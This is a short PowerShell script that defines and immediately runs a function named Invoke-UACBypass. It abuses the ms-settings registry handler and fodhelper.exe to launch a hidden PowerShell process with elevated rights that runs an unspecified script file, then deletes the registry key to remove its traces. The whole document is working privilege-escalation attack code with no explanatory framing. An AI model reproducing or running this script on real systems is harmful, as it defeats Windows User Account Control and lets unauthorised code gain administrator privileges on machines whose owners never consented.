function Invoke-UACBypass {
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $RegPath -Force
    Set-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value ""
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File $scriptPath'"
    Start-Process "fodhelper.exe"
    Start-Sleep -Seconds 5
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}
Invoke-UACBypass
